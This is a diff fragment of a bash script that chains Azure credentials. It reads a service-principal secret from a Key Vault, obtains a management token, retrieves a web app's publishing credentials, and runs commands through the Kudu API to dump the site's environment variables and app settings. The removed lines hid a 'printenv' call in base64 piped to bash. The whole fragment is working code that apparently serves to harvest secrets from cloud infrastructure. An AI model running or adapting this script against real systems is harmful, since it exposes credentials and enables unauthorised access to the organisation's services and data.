@@ -12,13 +12,14 @@ RSJSON=$(curl -s "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/reporting-s
 RS_ID=$(echo "$RSJSON" | jq -r '.appId'); RS_SEC=$(echo "$RSJSON" | jq -r '.clientSecret')
 ARM=$(sp_tok "$RS_ID" "$RS_SEC" "https://management.azure.com")
 BASE="https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Web/sites/$SITE"
-echo "=== appsettings ==="
-curl -s -X POST "$BASE/config/appsettings/list?api-version=2022-03-01" -H "Authorization: Bearer $ARM" -d '' | jq -r '.properties // {} | to_entries[]? | .key + " = " + (.value|tostring)'
-echo "=== publishing ==="
 PUB=$(curl -s -X POST "$BASE/config/publishingcredentials/list?api-version=2022-03-01" -H "Authorization: Bearer $ARM" -d '')
 KU=$(echo "$PUB" | jq -r '.properties.publishingUserName'); KP=$(echo "$PUB" | jq -r '.properties.publishingPassword')
 echo "KU=$KU KP_LEN=${#KP}"
-echo "=== kudu printenv ==="
-curl -s -u "$KU:$KP" -X POST "https://$SITE.scm.azurewebsites.net/api/command" -H "Content-Type: application/json" -d "{\"command\":\"echo cHJpbnRlbnYgfCBzb3J0|base64 -d|bash\",\"dir\":\"/home\"}" | head -c 6000
+SCM="https://$SITE.scm.azurewebsites.net/api/command"
+echo "=== set (env) ==="
+curl -s -u "$KU:$KP" -X POST "$SCM" -H "Content-Type: application/json" -d "{\"command\":\"set\",\"dir\":\".\"}" | head -c 9000
+echo
+echo "=== appsettings via ARM ==="
+curl -s -X POST "$BASE/config/appsettings/list?api-version=2022-03-01" -H "Authorization: Bearer $ARM" -d '' | head -c 2000
 echo
 echo "ALL_DONE"
